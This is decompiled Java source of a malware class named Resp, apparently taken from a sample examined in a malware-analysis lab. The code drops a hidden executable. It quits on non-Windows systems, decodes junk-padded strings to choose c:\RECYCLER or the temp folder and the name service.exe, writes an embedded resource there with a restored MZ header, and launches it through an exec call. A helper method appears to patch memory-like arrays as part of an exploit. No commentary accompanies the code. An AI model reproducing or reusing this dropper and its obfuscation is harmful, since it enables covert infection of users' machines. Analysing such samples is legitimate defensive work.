/*     */ import java.io.File;
/*     */ import java.io.FileNotFoundException;
/*     */ import java.io.FileOutputStream;
/*     */ import java.io.IOException;
/*     */ import java.io.InputStream;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ class Resp
/*     */ {
/*     */   public Resp(String paramString) {
/*  14 */     if (!Issue._isWin) {
/*  15 */       System.exit(0);
/*     */     }
/*  17 */     FileOutputStream fileOutputStream = null;
/*     */     
/*  19 */     String str = Issue.csfn("12312c123:123\\123R123E12C213Y423C45L6345E634345R\\65452321266142523");
/*  20 */     if (!createDir(str)) {
/*     */       
/*  22 */       str = System.getProperty(Issue.csfn("1234j432a453v134a453.643i23o45.234t54m652p234d54i234r5432245"));
/*  23 */       if (!str.endsWith("/") && !str.endsWith("\\")) {
/*  24 */         str = str + System.getProperty(Issue.csfn("file.separator"));
/*     */       }
/*     */     } 
/*  27 */     str = str + Issue.csfn("324s23er34365v45i34c323e24.5555e544x234e");
/*     */     
/*  29 */     InputStream inputStream = getClass().getResourceAsStream(paramString);
/*     */     
/*  31 */     if (inputStream == null) System.exit(0);
/*     */ 
/*     */     
/*     */     try {
/*  35 */       fileOutputStream = new FileOutputStream(str);
/*     */     } catch (FileNotFoundException fileNotFoundException) {
/*  37 */       System.exit(0);
/*     */     } 
/*  39 */     byte[] arrayOfByte1 = new byte[2];
/*  40 */     byte[] arrayOfByte2 = new byte[256];
/*     */     
/*     */     try {
/*  43 */       int i = inputStream.read(arrayOfByte1);
/*  44 */       if (i == 2) {
/*     */         
/*  46 */         arrayOfByte1[0] = 77;
/*  47 */         arrayOfByte1[1] = 90;
/*  48 */         fileOutputStream.write(arrayOfByte1, 0, 2);
/*     */       } 
/*  50 */     } catch (IOException iOException) {}
/*     */     
/*     */     while (true) {
/*     */       try {
/*  54 */         int i = inputStream.read(arrayOfByte2);
/*  55 */         if (i < 0) {
/*     */           
/*  57 */           fileOutputStream.close();
/*  58 */           inputStream.close();
/*     */           break;
/*     */         } 
/*  61 */         fileOutputStream.write(arrayOfByte2, 0, i);
/*     */       
/*     */       }
/*  64 */       catch (IOException iOException) {}
/*     */     } 
/*     */ 
/*     */ 
/*     */     
/*     */     try {
/*  70 */       Thread.sleep(2000L);
/*  71 */       info1.funcRun(Issue.csfn("34125e5x34e23c"), str);
/*     */     }
/*  73 */     catch (Exception exception) {}
/*     */     
/*  75 */     System.exit(0);
/*     */   }
/*     */ 
/*     */   
/*     */   public static boolean createDir(String paramString) {
/*  80 */     File file = new File(paramString);
/*  81 */     if (file.exists())
/*  82 */       return true; 
/*  83 */     if (!paramString.endsWith(File.separator))
/*  84 */       paramString = paramString + File.separator; 
/*  85 */     if (file.mkdirs()) {
/*  86 */       return true;
/*     */     }
/*  88 */     return false;
/*     */   }
/*     */ 
/*     */   
/*     */   public static int aLoop(int paramInt, Object[] paramArrayOfObject, int[] paramArrayOfint) {
/*  93 */     boolean bool = false;
/*  94 */     int i = paramArrayOfObject.length;
/*  95 */     for (int j = paramInt + 2; j < paramInt + 32; j++) {
/*  96 */       if (paramArrayOfint[j - 1] == i && paramArrayOfint[j] == 0 && paramArrayOfint[j + 1] == 0 && paramArrayOfint[j + 2] != 0 && paramArrayOfint[j + 3] != 0 && paramArrayOfint[j + 4] != 0 && paramArrayOfint[j + 5] == 0 && paramArrayOfint[j + 6] == 0) {
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */         
/* 105 */         int k = paramArrayOfint[j + 4];
/* 106 */         for (int m = j + 7; m < j + 71; m++) {
/* 107 */           if (paramArrayOfint[m] == k) {
/*     */             
/* 109 */             paramArrayOfint[m - 1] = paramArrayOfint[j + 3];
/* 110 */             bool = true; break;
/*     */           } 
/*     */         } 
/* 113 */         if (bool)
/*     */           break; 
/*     */       } 
/* 116 */     }  return bool;
/*     */   }
/*     */ }


/* Location:              /home/remnux/malware/embassy/1.jar!/Resp.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       1.1.3
 */